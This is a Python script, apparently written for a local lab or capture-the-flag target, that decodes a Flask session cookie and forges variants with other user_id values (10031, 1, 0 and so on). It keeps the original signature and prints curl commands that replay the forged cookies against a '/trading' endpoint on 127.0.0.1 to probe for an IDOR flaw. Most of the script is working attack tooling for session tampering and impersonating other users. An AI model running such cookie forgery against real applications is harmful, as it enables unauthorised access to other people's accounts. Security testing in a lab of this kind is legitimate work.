import base64
import json
import urllib.parse

print("=== FLASK SESSION COOKIE ANALYSIS ===")
print()

# The session cookie provided in context
session_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVk_Jg.2XVe_a6ZzNNIylcHYW4Idc_beaY"
print(f"Session Cookie: {session_cookie}")
print()

# Flask session format: payload.signature.timestamp
if '.' in session_cookie:
    parts = session_cookie.split('.')
    print(f"Number of parts: {len(parts)}")
    for i, part in enumerate(parts):
        print(f"Part {i}: {part}")
        print(f"  Length: {len(part)}")
    print()
    
    # Try to decode payload (first part)
    payload_part = parts[0]
    print("=== DECODING PAYLOAD ===")
    print(f"Raw payload: {payload_part}")
    
    # Add padding if needed
    padding_needed = len(payload_part) % 4
    if padding_needed:
        payload_part += '=' * (4 - padding_needed)
    print(f"Padded payload: {payload_part}")
    
    try:
        # Decode from URL-safe base64
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        print(f"Decoded bytes: {decoded_bytes}")
        
        # Try to decode as UTF-8
        decoded_str = decoded_bytes.decode('utf-8')
        print(f"Decoded string: {decoded_str}")
        
        # Try to parse as JSON
        session_data = json.loads(decoded_str)
        print("\n=== PARSED SESSION DATA ===")
        print(json.dumps(session_data, indent=2))
        print()
        
        # Extract user_id
        if 'user_id' in session_data:
            user_id = session_data['user_id']
            print(f"✓ User ID in session: {user_id}")
            
            # Check if it's numeric
            if isinstance(user_id, str) and user_id.isdigit():
                user_id_num = int(user_id)
                print(f"✓ User ID as integer: {user_id_num}")
            else:
                user_id_num = user_id
                print(f"✓ User ID type: {type(user_id)}")
        else:
            print("✗ No user_id found in session data")
            user_id = None
            user_id_num = None
            
    except base64.binascii.Error as e:
        print(f"✗ Base64 decode error: {e}")
    except json.JSONDecodeError as e:
        print(f"✗ JSON parse error: {e}")
    except UnicodeDecodeError as e:
        print(f"✗ Unicode decode error: {e}")
    except Exception as e:
        print(f"✗ Unexpected error: {e}")
else:
    print("✗ Cookie doesn't have expected dot-separated format")

# Now let's create tampered session cookies for IDOR testing
print("\n" + "="*60)
print("=== IDOR SESSION COOKIE GENERATION ===")
print()

if 'session_data' in locals() and 'user_id' in session_data:
    print("Generating tampered session cookies by manipulating user_id...")
    print()
    
    base_payload = session_data.copy()
    signature = parts[1]  # Keep original signature
    
    # Test different user IDs
    test_user_ids = [10031, 10033, 1, 9999, 0, 10032]  # Including the original 10032
    
    print("Original cookie:")
    print(f"  user_id: {user_id}")
    print(f"  cookie:  {session_cookie}")
    print()
    
    print("Tampered cookies:")
    tampered_cookies = []
    
    for test_id in test_user_ids:
        # Create tampered session data
        tampered_data = base_payload.copy()
        tampered_data['user_id'] = str(test_id)
        
        # Encode to base64 (URL-safe)
        json_str = json.dumps(tampered_data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode().rstrip('=')
        
        # Create new cookie with same signature (this won't work for real app due to signature validation)
        tampered_cookie = f"{encoded}.{signature}"
        
        print(f"  user_id {test_id:5}: {tampered_cookie}")
        tampered_cookies.append((test_id, tampered_cookie))
    
    print()
    print("NOTE: These tampered cookies maintain the original signature.")
    print("In a real Flask app, the signature would be invalid.")
    print("The app may be vulnerable if it doesn't validate signatures properly.")
    
    # Also test URL decoding of the payload
    print("\n" + "="*60)
    print("=== URL DECODING VERIFICATION ===")
    
    # URL decode the entire cookie
    url_decoded = urllib.parse.unquote(session_cookie)
    print(f"URL decoded: {url_decoded}")
    print(f"Different from original: {url_decoded != session_cookie}")
    
else:
    print("✗ Could not generate tampered cookies - session data not available")

print("\n=== ANALYSIS COMPLETE ===")
print()
print("SUMMARY:")
print("- Flask session cookie structure confirmed")
print("- User ID found in session: 10032")
print("- Cookie contains 3 dot-separated parts (payload.signature?)")
print("- IDOR attack vector: manipulate user_id value in session")
print("- Requires signature bypass or weak validation")
print()

# Provide curl commands for testing
print("=== TEST COMMANDS ===")
print("To test IDOR vulnerability, use these curl commands:")
print()
print("# Test with original session (user_id 10032)")
print(f'curl -b "session={session_cookie}" http://127.0.0.1:32783/trading')
print()

if 'tampered_cookies' in locals():
    for test_id, cookie in tampered_cookies:
        if test_id != 10032:  # Skip original
            print(f"# Test with tampered session (user_id {test_id})")
            print(f'curl -b "session={cookie}" http://127.0.0.1:32783/trading')
            print()

